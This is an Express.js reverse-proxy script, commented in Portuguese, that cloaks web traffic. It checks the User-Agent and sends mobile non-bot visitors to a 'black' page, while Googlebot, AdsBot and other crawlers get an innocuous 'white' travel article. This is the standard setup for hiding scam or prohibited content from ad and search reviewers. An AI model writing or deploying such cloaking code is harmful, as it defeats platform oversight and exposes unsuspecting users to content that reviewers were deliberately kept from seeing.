const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');

const app = express();

// Configuração do proxy reverso para a página black
const proxyOptionsBlack = {
    target: 'https://portalolivianews.com/public/content.html',  // Substitua pelo URL da sua aplicação em produção
  changeOrigin: true,  // Mudar o cabeçalho Host para o host do destino
  secure: true  // Habilitar verificação SSL
};

// Configuração do proxy reverso para a página white
const proxyOptionsWhite = {
    target: 'https://www.megamodahotel.com.br/cultura/como-arrumar-uma-mala-de-viagem-feminina/',  // URL da página white
    changeOrigin: true,  // Mudar o cabeçalho Host para o host do destino
  secure: true  // Habilitar verificação SSL
};

// Criar o middleware do proxy baseado nas opções acima
const proxyBlack = createProxyMiddleware(proxyOptionsBlack);
const proxyWhite = createProxyMiddleware(proxyOptionsWhite);

// Middleware para determinar qual proxy usar
app.use((req, res, next) => {
  const userAgent = req.headers['user-agent'].toLowerCase();
  const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent);
  const isBot = /googlebot|bingbot|yandexbot|duckduckbot|baiduspider|sogou|exabot|msnbot|teoma|slurp/i.test(userAgent);
  const isGoogleBot = /googlebot|googlebot-image|googlebot-video|googlebot-mobile|adsbot-google(?:-mobile)?|mediapartners-google/i.test(userAgent);


  // Definir uma propriedade customizada no request para indicar qual proxy usar
  if (!isBot && !isGoogleBot && isMobile) {
    return proxyBlack(req, res, next); // Encaminha a requisição para o proxy da página black  } else {
  } else {
    return proxyWhite(req, res, next); // Encaminha para a página white se não atender aos critérios
  }

});

// Iniciar o servidor na porta 3000 (ou outra porta de sua escolha)
const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`Servidor proxy rodando em http://localhost:${port}`);
});
